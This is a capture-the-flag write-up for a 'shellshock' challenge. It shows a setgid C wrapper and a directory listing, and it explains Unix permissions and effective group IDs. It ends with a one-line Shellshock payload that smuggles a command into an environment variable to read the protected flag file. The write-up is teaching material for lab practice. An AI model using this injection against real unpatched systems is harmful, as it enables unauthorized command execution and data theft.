# shellshock

### shellshock.c
``` c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

### file 
```
shellshock@prowl:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 114 root root             4096 May 19 15:59 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

          link number   file group
             |              |
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
    |            |                     
file permission  owner

## 檔案屬性
```
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
```
`-`   : d for directory, - for file, l for link file\
rwx\
r-x : first is for file owner\
r-s : second is for user in this group\
r-x : the other\
where `s` stand for set owner user id on execution (s), so you can use root permission to execute this file temporary.


## what is getegid() ? and what egid do ?

[`see this first`](https://jvns.ca/blog/2017/11/20/groups/)\
`egid` stand for `effective group id` , `effetctive id ` is used for access check. 

## solution
The title of this challenge is `shellshock`, so let's google it first !
So use this hint :\
![shellshock](https://www.symantec.com/connect/sites/default/files/users/user-2598031/shellshock-command-diagram-600px_v2.png)

So :
```
env val='() { :;}; cat flag' ./shellshock
```